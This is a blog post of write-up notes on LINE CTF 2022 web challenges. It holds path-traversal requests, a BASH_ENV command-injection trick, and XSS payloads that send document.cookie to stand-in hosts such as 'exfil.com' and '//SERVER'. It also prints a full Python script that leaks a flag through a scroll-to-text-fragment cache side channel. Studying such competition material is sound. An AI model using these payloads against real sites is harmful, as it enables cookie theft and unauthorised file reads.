---
title: LINE CTF 2022 Notes
date: 2022-03-27 15:15:47
tags: [Security]
categories: [Security]
photos: /img/linectf-2022-writeup/cover-en.png
---

I participated in LINE CTF 2022 with the team [Water Paddler](https://twitter.com/Water_Paddler) and we ranked seventh with the help of my teammates. I only contributed to one question, while the others were solved by my teammates or stuck. This article briefly summarizes the solutions to each question, most of which are referenced from [LINE CTF 2022 Writeups by maple3142](https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups).

<!-- more -->

## gotm(96 solves)

This question was solved by my teammates, so I didn't look into it carefully. However, after the game, I read other writeups and found that it was a go SSTI, which appeared here:

``` go
acc := get_account(id)
tpl, err := template.New("").Parse("Logged in as " + acc.id)
if err != nil {
}
tpl.Execute(w, &acc)
```

I haven't encountered go SSTI before, so I took some notes. You can use {`{.}}` to dump the entire object passed in. Here are a few reference links:

1. [GO中SSTI研究](https://forum.butian.net/share/1286)
2. [Go SSTI初探](https://tyskill.github.io/posts/gossti/)

## Memo Drive(42 solves)

First, here is the key code:

``` py
def view(request):
    context = {}

    try:
        context['request'] = request
        clientId = getClientID(request.client.host)

        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            raise
        
        filename = request.query_params[clientId]
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
        
        f = open(path, 'r')
        contents = f.readlines()
        f.close()
        
        context['filename'] = filename
        context['contents'] = contents
```

The flag for this question is in `./memo/flag`, so all we need to do is find a way to read the flag from the path in the above code.

My teammate used this payload: `/view?id=flag;%2f%2e%2e/;`. Since I'm not familiar with Python, I set up a simple server to observe:

``` python
from urllib.parse import unquote
import uvicorn
from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import JSONResponse

def view(request):

    try:
        clientId = "id"
        print("request.url:", request.url)
        print("request.url.query", request.url.query)
        print("params:", request.query_params)
        print("unquote params:", unquote(request.query_params[clientId]))
        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
            raise
        
        filename = request.query_params[clientId]
        print("filename:", filename)
        print("keys:", request.query_params.keys())
        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
        print("path:", path)
    
    except:
        pass
    
    return JSONResponse({"a":1})

routes = [
    Route('/view', endpoint=view)
]

app = Starlette(debug=True, routes=routes)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=11000)
```

Let's take a look at what my teammate's payload does: `/view?id=flag;%2f%2e%2e/;`

```
request.url: http://0.0.0.0:11000/view?id=flag;%2f%2e%2e/;
request.url.query id=flag;%2f%2e%2e/;
params: id=flag&%2F..%2F=
unquote params: flag
filename: flag
keys: dict_keys(['id', '/../'])
path: ./memo/id/..//flag
```

`request.url` is the raw URL without decoding, and `request.url.query` is also the undecoded version. When it reaches `request.query_params`, it is parsed into two params:

1. id=flag
2. %2F..%2f=

It seems that even if you don't use `&`, you can create two params because of the semicolon `;`.

Finally, when `request.query_params.keys()` is decoded, it becomes `./memo/id..//flag`.

However, I saw on Discord that this is enough: `id=flag;/%2e%2e`. The result is:

``` py
request.url: http://0.0.0.0:11000/view?id=flag;/%2e%2e
request.url.query id=flag;/%2e%2e
params: id=flag&%2F..=
unquote params: flag
filename: flag
keys: dict_keys(['id', '/..'])
path: ./memo/id/../flag
```

I also saw a different solution on Discord (from bbangjo#3967), which uses the Host header:

```
GET http://0.0.0.0:11000/view?id=flag&/..
Host: 0.0.0.0#
```

It produces a magical result:

```
request.url: http://0.0.0.0#/view?id=flag&/..
request.url.query
params: id=flag&%2F..=
unquote params: flag
filename: flag
keys: dict_keys(['id', '/..'])
path: ./memo/id/../flag
```

Although `request.url.query` disappears completely, `request.query_params` still has something, so it bypasses the check for `request.url.query`.

According to him, since `request.url` is constructed from the Host header, we can check the code to verify it. If I'm not mistaken, it should be here: [starlette/datastructures.py#L38](https://github.com/encode/starlette/blob/b1ae0c3621034f1531b9983389ce90be8d140bc6/starlette/datastructures.py#L38):

``` py
if host_header is not None:
  url = f"{scheme}://{host_header}{path}"
```

Because the Host is followed by a `#`, the query string behind it is parsed as a fragment, not a query string. Therefore, `request.url.query` will be empty.

Why does `request.query_params` still have something? Because it directly takes the original query string, not `request.url.query`, here: [starlette/requests.py#L116](https://github.com/encode/starlette/blob/6182d0a0bc7e5817197d2919b18d67f70e3a71d1/starlette/requests.py#L116)

``` py
@property
def query_params(self) -> QueryParams:
    if not hasattr(self, "_query_params"):
        self._query_params = QueryParams(self.scope["query_string"])
    return self._query_params
```

This is a difference that can only be found by looking at the source code.

Supplement on March 29, 2022:

Thanks to @Zedd for reminding us that the behavior of treating `;` as `&` is related to the Python version, because it can cause cache poisoning. This issue has been fixed in newer versions, and the version used in the challenge is 3.9.0, which is why this problem exists. When I reproduced it on my local machine, I also used an unpatched version.

The vulnerability number is CVE-2021-23336, and details can be found here: [urllib parse_qsl(): Web cache poisoning - semicolon as a query args separator](https://python-security.readthedocs.io/vuln/urllib-query-string-semicolon-separator.html).

## bb(27 solves)

The code is very short:

``` php
<?php
    error_reporting(0);

    function bye($s, $ptn){
        if(preg_match($ptn, $s)){
            return false;
        }
        return true;
    }

    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i") && bye($v, "/[a-zA-Z]/i")) {
            putenv("{$k}={$v}");
        }
    }
    system("bash -c 'imdude'");
    
    foreach($_GET["env"] as $k=>$v){
        if(bye($k, "/=/i")) {
            putenv("{$k}");
        }
    }
    highlight_file(__FILE__);
?>
```

Basically, it is to achieve RCE after controlling the environment variables, which naturally reminds people of the article published by P cow some time ago: [How I hack bash through environment injection](https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html), which mentions that commands can be executed by controlling `BASH_ENV`.

However, the more troublesome thing is that a-zA-Z cannot be used, so you have to write instructions to read the flag and return it to your own server without using English letters.

Someone in the chat room gave a link to a similar problem for reference: [34C3 CTF / Tasks / minbashmaxfun / Writeup](https://ctftime.org/writeup/8468). After reading the writeup given at the beginning, I realized that it can be used like this:

```
# Equivalent to $'id'
$'\151\144'
```

By doing this, you can bypass the restrictions without using letters. Bash is really profound.

Someone posted this string on Discord, which is worth referring to and taking notes: [Readable version](https://threadreaderapp.com/thread/1023682809368653826.html), Twitter original string: https://twitter.com/DissectMalware/status/1023682809368653826

## online library(19 solves)

This is a web page that can read a specific file range, and the key is in this part:

``` js
app.get("/:t/:s/:e", (req: Express.Request, res: Express.Response): void => {
    const s: number = Number(req.params.s)
    const e: number = Number(req.params.e)
    const t: string = req.params.t

    if ((/[\x00-\x1f]|\x7f|\<|\>/).test(t)) {
        res.end("Invalid character in book title.")
    } else  {
        Fs.stat(`public/${t}`, (err: NodeJS.ErrnoException, stats: Fs.Stats): void => {
            if (err) {
                res.end("No such a book in bookself.")
            } else {
                if (s !== NaN && e !== NaN && s < e) {
                    if ((e - s) > (1024 * 256)) {
                        res.end("Too large to read.")
                    } else {
                        Fs.open(`public/${t}`, "r", (err: NodeJS.ErrnoException, fd: any): void => {
                            if (err || typeof fd !== "number") {
                                res.end("Invalid argument.")
                            } else {
                                let buf: Buffer = Buffer.alloc(e - s);
                                Fs.read(fd, buf, 0, (e - s), s, (err: NodeJS.ErrnoException, bytesRead: number, buf: Buffer): void => {
                                    res.end(`<h1>${t}</h1><hr/>` + buf.toString("utf-8"))
                                })
                            }
                        })
                    }
                } else {
                    res.end("There isn't size of book.")
                }
            }
        })
    }
});
```

Put `/%2e%2e%2f/0/12345` in the path, and you can perform path traversal and read any file, but the question is which file to read.

With the help of teammates, we read `/proc/self/mem`, which is the memory of the current node process. As for which segment to read, you have to look it up from `/proc/self/maps`.

Then, because an endpoint will put the parameters into memory, you can use that endpoint to put your payload first, and then because this problem gives an offset when reading the file, you can find the payload in memory and set the offset, and then send it to the bot for XSS.

However, according to post-match discussions, it seems that because the flag is in the cookie, when the bot sends a request to the server, the flag will also appear in the memory, so you can directly read the memory to find the flag without using XSS.

## Haribote Secure Note(7 solves)

This problem took a whole day to solve, but still couldn't solve it, so sad QQ

You can set a nickname, up to 16 characters, and then add notes with a title and content. The key code for displaying notes is here:

``` html
<script nonce="{{ csp_nonce }}">
    const printInfo = () => {
        const sharedUserId = "{{ shared_user_id }}";
        const sharedUserName = "{{ shared_user_name }}";
        // 省略
    }

    const printInfoBtn = document.getElementById('printInfoBtn');
    printInfoBtn.addEventListener('click', printInfo);
</script>
```

And this part near the end:

``` html
<script nonce="{{ csp_nonce }}">
    const render = notes => {
        // 省略
    };
    render({{ notes }})
</script>
```

The former gives us 16 characters of JS injection, and the latter can use `</script>` to escape the tag, which is HTML injection. The difficulty of this problem lies in the fact that the CSP is very strict:

``` html
<meta content="default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-{{ csp_nonce }}'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
          http-equiv="Content-Security-Policy">
```

Because there is a nonce, `unsafe-inline` does not work, and `unsafe-eval` is not enabled, so there is no way to dynamically execute code.

At the time, after struggling for a long time, I had an idea that we could use HTML injection to insert a form `<form id="f">`, and then CSRF admin to change the admin's nickname, because the other page profile has no CSP and can also be injected:

``` html
<input name="display_name" type="text" class="form-control form-control-sm"
 id="inputUserDisplayName"
 value="{{ current_user.display_name }}">
```

The nickname part can be set to `";f.submit();"` or similar, to submit the form. After changing it, visit the profile page and execute XSS on that page.

But the biggest problem is that `"onfocus=eval(name)` has 20 characters, which exceeds the limit and cannot be successful (and you also need to think about how to set the name).

After the competition, I looked at other people's solutions, mainly three types.

The first one comes from [Super HexaGoN](https://gist.github.com/mdsnins/d8028c47212342ecadd9af5ec10f53f9), which uses a magical [script data double escaped state](https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state) to comment out everything between the two injection points, and then execute the code in a script with a nonce. I had never seen this before, so I'll have to study it later.

```
display name: <!--<script>"}/*
title: --> /*
content: */ location.href='(attacker)/c='+document.cookie
```

The second one uses the feature that [import is not blocked by Trusted Types](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types/#script-loading-like-import), and the payload below comes from [maple3142](https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/#haribote-secure-note):

``` js
display name:
"+import(y)+"

title:
</script><a id=x href="//SERVER"></a>

content:
<a id=y href="data:text/javascript,open(x+`?`+document.cookie);alert()"></a>
```

The third one uses an iframe to execute code on other pages (from eskildsen#8025):

```
name:
";f.eval(p+"");"

title:
</script><iframe src="/p" name=f></iframe> 

content:
<a href="javascript:window.top.location='http://exfil.com/'+btoa(this.parent.document.cookie)" id=p name=p>payload</a> 
```

The third one is the only one I think I might have thought of, because I didn't know the other two.

By the way, `";f.eval(p+"");"` and `<!--<script>"}/*` both happen to be 16 characters long, so I guess one of them is an unexpected solution, which is the fun of CTF XD.

And this question is really interesting and worth learning, as all three solutions are completely different.

Oh, by the way, maple3142's writeup solved a puzzle for me, which is why the templates for this question are not escaped. It turns out that Flask defaults to only escaping HTML/XML/XHTML, which is why I didn't see any settings.

## title todo(6 solves)

This question is basically a website for uploading pictures. After uploading, you will get a URL, and then you can create a new post with the title and image URL.

The flag is placed in the footer of the webpage when visited with admin privileges, and has a strange format: `LINECTF{([0-9a-f]/){10}}`.

Then there is a place on the page that is not enclosed in double quotes:

``` html
<img src={{ image.url }} class="mb-3">
```

Although it looks like a small detail, the entire solution actually stems from this. From here, it is easy to see that we can control any attribute of the img, but I was stuck here for a while, thinking that if we can control it, what's the point? We can't XSS if we can't get out of the img.

Then, after being reminded by my teammate, I thought of the xsleak of [STTF](https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/), which detects scrolling behavior through the lazy loading of images. Therefore, as long as the title is very long, the img is pushed down, and the `loading=lazy` attribute is added, it can be used with STTF to leak one byte.

However, there is one thing to note about this question, which is CSP:

```
default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' blob:
```

CSP cannot be bypassed, so even if `src` is controllable, external images cannot be set. Therefore, this question has added another mechanism: cache, which can determine whether the cache of an image is a miss or a hit based on the response header. Therefore, we only need to upload a new image and give it to the bot, and then check its response header after a few seconds. If it is a hit, it means that the bot has accessed the image, which means that SSTF has succeeded.

Just write an exploit based on this concept:

``` py
import requests
import json
import time
from time import sleep

base_url = 'http://35.187.204.223'
cookie = "session=.eJwtzrERwzAIAMBdVKcAJCHkZXyA4JzWjqtcdk-K_AT_LnuecR1le513PMr-XGUrqLggVU2SQCFTKqiIUxpbIhpNThy0GkEdXWaGdJ-16nJ3GAO8iwP0QeY5ISjnzLoImHE5VwmdzVCIaxOMMNGIPrizhlErv8h9xfnfAJTPF00fL_M.Yj71GQ.S1yffSzbOk6Rny1VyCqPTL-5wM8"

def upload_image():
  files = {'img_file': open('a.png','rb')}

  resp = requests.post(base_url + '/image/upload', files=files, headers={
    "Cookie": cookie
  })
  return json.loads(resp.text)

def create_post(url):
  resp = requests.post(base_url + '/image', data={
    "title": str(time.time()) + "w"*5000,
    "img_url": f"/static/image/111 srcset={url} loading=lazy "
  }, headers={
    "Cookie": cookie
  }, allow_redirects=False)
  return resp.headers["X-ImageId"]

def share(url, keyword):
  resp = requests.post(base_url + '/share', json={
    "path": "image/" + url + "#:~:text=" + keyword,
  }, headers={
    "Cookie": cookie
  })
  return resp.text

def check_cached(img_url):
  resp = requests.get(base_url + img_url, headers={
    "Cookie": cookie
  }, allow_redirects=False)
  return resp.headers["X-Cache-Status"]

def run():
  known = "LINECTF{"
  while True:
    for char in "0123456789abcdef":
      print("trying:" + known+char)

      resp = upload_image()
      img_url = resp["img_url"]
      print("img url:" + img_url)

      img_id = create_post(img_url)
      print("img id:" + img_id)

      share_res = share(img_id, known + char)
      print("resp:" + share_res)

      sleep(3)
      cache_resp = check_cached(img_url)
      print("cached:" + cache_resp)
      if cache_resp == "HIT":
        known += char + "/"
        print(known)
        break


run()
```

In addition, maple3142's writeup solved a confusion for me, which is why the flag needs those `/`? It turns out that Chromium, in order to avoid this kind of xsleak, must match the entire word when judging SSTF in order to scroll.

For example, if there is this string on the page: `Hello world`, your text fragment specifies `He`, it will not work, it must be `Hello`, which is why this question uses `/` to separate, because if it is not separated, it will not be possible to leak one word at a time.

## me7-ball(2 solves)

This question seems to be more related to crypto, so I didn't look at it carefully and directly posted Super HexaGoN's writeup: https://gist.github.com/mdsnins/2912b9656c837e5190364136b307c682
